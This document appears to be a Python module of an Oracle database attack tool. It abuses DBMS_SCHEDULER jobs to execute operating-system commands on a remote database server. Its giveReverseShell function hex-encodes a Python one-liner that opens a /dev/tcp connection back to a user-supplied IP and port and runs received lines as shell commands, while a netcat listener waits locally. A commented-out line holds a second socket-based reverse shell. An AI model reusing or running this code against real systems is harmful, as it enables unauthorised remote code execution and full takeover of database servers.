#!/usr/bin/python
# -*- coding: utf-8 -*-

from OracleDatabase import OracleDatabase
import logging, cx_Oracle, subprocess
from Utils import ErrorSQLRequest, checkOptionsGivenByTheUser
from Constants import *
from time import sleep
from threading import Thread

class DbmsScheduler (OracleDatabase):
	'''
	Allow the user to execute a command on the remote database system with DBMS_SCHEDULER
	'''
	def __init__(self,args):
		'''
		Constructor
		'''
		logging.debug("DbmSscheduler object created")
		OracleDatabase.__init__(self,args)
		self.jobName = None

	def __createJob__(self,cmd):
		'''
		Create a job for DBMS_SCHEDULER
		Be Careful: Special chars are not allowed in the command line
		'''
		logging.info('Create a job named {0}'.format(self.jobName))
		splitCmd = cmd.split()
		parameters = {'job_name':self.jobName,'job_type':'EXECUTABLE','job_action':splitCmd[0],'number_of_arguments':len(splitCmd)-1,'auto_drop':False}
		cursor = cx_Oracle.Cursor(self.args['dbcon'])
		try :
			if self.args['show_sql_requests'] == True: logging.info("SQL request executed: DBMS_SCHEDULER.create_job with these parameters: {0}".format(parameters))
			cursor.callproc(name="DBMS_SCHEDULER.create_job",keywordParameters=parameters)
		except Exception,e: 
			logging.info('Error with DBMS_SCHEDULER.create_job:{0}'.format(self.cleanError(e)))
			return ErrorSQLRequest(e)
		else :
			for pos,anArg in enumerate(splitCmd):
				if pos!=0:
					parameters = {'job_name':self.jobName,'argument_position':pos,'argument_value':anArg}
					try :
						if self.args['show_sql_requests'] == True: logging.info("SQL request executed: DBMS_SCHEDULER.set_job_argument_value with these parameters: {0}".format(parameters))
						cursor.callproc(name="DBMS_SCHEDULER.set_job_argument_value",keywordParameters=parameters)
					except Exception,e: 
						logging.info('Error with DBMS_SCHEDULER.set_job_argument_value:{0}'.format(self.cleanError(e)))
						return ErrorSQLRequest(e)
		return True

	def __runJob__(self):
		'''
		run the job named self.jobName
		'''
		logging.info('Run the job')
		cursor = cx_Oracle.Cursor(self.args['dbcon'])
		try :
			cursor.callproc(name="DBMS_SCHEDULER.enable",keywordParameters={'name':self.jobName})
		except Exception,e: 
			logging.info('DBMS_SCHEDULER.enable:{0}'.format(self.cleanError(e)))
			return ErrorSQLRequest(e)
		return True

	def __getJobStatus__(self):
		'''
		Get the job status from user_scheduler_job_log table	
		return Exception if error
		return False : the job is not created or job is running
		return Exception: there is an exception
		return string if NOT SUCCESS
		return True if SUCCESS
		'''
		sleep(3)
		query = "SELECT status, additional_info FROM USER_SCHEDULER_JOB_RUN_DETAILS WHERE job_name = '{0}'".format(self.jobName)
		response = self. __execThisQuery__(query=query,ld=['status','additional_info'])
		if isinstance(response,Exception) :
			logging.info('Error with the SQL request {0}: {1}'.format(query,str(response)))
			return ErrorSQLRequest(response)
		if response == [] : 
			self.args['print'].goodNews("The Job is running")
			return False
		elif response[0]['status'] == "FAILED" :
			self.args['print'].badNews("The Job has failed: {0}".format(response[0]['additional_info'])) 
			str(response[0]['additional_info'])
			return False
		else : 
			self.args['print'].goodNews("The Job is finish") 
			return True

	def execOSCommand(self,cmd):
		'''
		Execute an OS command on the remote database system
		Example: 
		    exec DBMS_SCHEDULER.CREATE_JOB(job_name=>'J1226',job_type=>'EXECUTABLE',number_of_arguments=>3,job_action =>'/bin/ping',auto_drop=>FALSE);
		    exec DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1226',1,'-c');
		    exec DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1226',2,'2');
		    exec DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1226',3,'192.168.56.1');
		    exec DBMS_SCHEDULER.ENABLE('J1226');
		    select log_id, log_date, job_name, status, error#, additional_info from dba_scheduler_job_run_details where job_name ='J1226'; 
		'''
		self.jobName = self.__generateRandomString__(nb=20)
		logging.info('Execute the following command on the remote database system: {0}'.format(cmd))
		logging.info('Be Careful: Special chars are not allowed in the command line')
		status = self.__createJob__(cmd)
		if isinstance(status,Exception): return status
		status = self.__runJob__()
		if isinstance(status,Exception): return status
		return True

	def __runListenNC__ (self,port=None):
		'''
		nc listen on the port
		'''
		try :
			subprocess.call("nc -l -v -p {0}".format(port), shell=True)
		except KeyboardInterrupt: pass

	def giveReverseShell(self, localip, localport):
		'''
		Give a reverse tcp shell via nc
		Need upload nc.exe if the remote system is windows
		'''
		if self.remoteSystemIsWindows() == True :
			logging.warn("Java reverse shell is not implement for Windows yet")
			pass
		elif self.remoteSystemIsLinux() == True :
			#PYTHON_CODE = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""".format(localip, localport)
			PYTHON_CODE = """import os; os.system('exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done');""".format(localip, localport)
			CMD = '''/usr/bin/python -c exec('{0}'.decode('hex'))'''.format(PYTHON_CODE.encode('hex'))
			logging.debug('The following command will be executed on the target: {0}'.format(CMD))
			self.args['print'].goodNews("The python reverse shell tries to connect to {0}:{1}".format(localip,localport))
			a = Thread(None, self.__runListenNC__, None, (), {'port':localport})
			a.start()
			try :
				self.execOSCommand(cmd=CMD)
			except KeyboardInterrupt: 
				self.args['print'].goodNews("Connection closed")
			self.__getJobStatus__()
		else :
			logging.error("The remote server OS ({0}) is unknown".format(self.remoteOS.lower()))
		
	def testAll (self):
		'''
		Test all functions
		'''
		command = self.__generateRandomString__()	
		self.args['print'].subtitle("DBMSSCHEDULER library ?")
		logging.info("Try to use the DBMScheduler library to execute the following random command: {0}".format(command))
		status = self.execOSCommand(cmd=command)
		if status == True or self.ERROR_BAD_FOLDER_OR_BAD_SYSTEM_PRIV in str(status):
			self.args['print'].goodNews("OK")
		else : 
			self.args['print'].badNews("KO")


def runDbmsSchedulerModule(args):
	'''
	Run the DBMSAdvisor module
	'''
	status = True
	if checkOptionsGivenByTheUser(args,["test-module","exec","reverse-shell"]) == False : return EXIT_MISS_ARGUMENT
	dbmsScheduler = DbmsScheduler(args)
	status = dbmsScheduler.connection(stopIfError=True)
	if args['test-module'] == True :
		args['print'].title("Test if the DBMSScheduler library can be used")
		status = dbmsScheduler.testAll()
	#Option 1: exec
	if args['exec'] != None:
		args['print'].title("Execute the `{0}` on the {1} server".format(args['exec'],args['server']))
		status = dbmsScheduler.execOSCommand(args['exec'])
		if status == True:
			args['print'].goodNews("The `{0}` command was executed on the {1} server".format(args['exec'],args['server']))
		else :
			args['print'].badNews("The `{0}` command was not executed on the {1} server: {2}".format(args['exec'],args['server'],str(status)))
		dbmsScheduler.__getJobStatus__()
	#Option 2: reverse shell
	if args['reverse-shell'] != None :
		args['print'].title("Try to give you a reverse shell from the {0} server".format(args['server']))
		dbmsScheduler.giveReverseShell(localip=args['reverse-shell'][0],localport=args['reverse-shell'][1])
	dbmsScheduler.close()






